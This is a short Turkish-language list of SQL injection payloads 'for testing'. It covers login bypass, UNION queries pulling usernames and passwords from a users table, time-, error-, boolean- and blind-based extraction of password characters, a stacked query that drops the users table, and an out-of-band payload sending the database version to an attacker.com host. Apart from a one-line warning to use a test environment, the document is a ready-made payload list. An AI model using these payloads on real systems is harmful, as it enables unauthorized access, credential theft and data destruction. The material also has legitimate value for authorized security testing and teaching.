SQL Injection testi için deneyebileceğiniz bazı örnek sorgular şunlardır:
Temel SQL Injection:
admin' OR '1'='1
admin' --
admin' #
Union-Based Injection:
admin' UNION SELECT 1,2,3 --
admin' UNION SELECT username,password,3 FROM tbl_users --
Time-Based Injection:
admin' AND SLEEP(5) --
admin' AND pg_sleep(5) --
Error-Based Injection:
admin' AND 1=CONVERT(int,(SELECT @@version)) --
admin' AND 1=CONVERT(int,(SELECT user())) --
Boolean-Based Injection:
admin' AND 1=1 --
admin' AND 1=2 --
Stacked Queries:
admin'; DROP TABLE tbl_users --
admin'; SELECT * FROM tbl_users --
Out-of-Band Injection:
admin' || (SELECT LOAD_FILE(concat('\\\\',(SELECT @@version),'.attacker.com\\share\\'))) --
Blind Injection:
admin' AND (SELECT SUBSTRING(password,1,1) FROM tbl_users WHERE username='admin')='a' --
admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM tbl_users WHERE username='admin')=97 --
Bu sorguları test ederken dikkatli olun, çünkü bazıları veritabanınıza zarar verebilir. Test ortamında kullanmanız önerilir.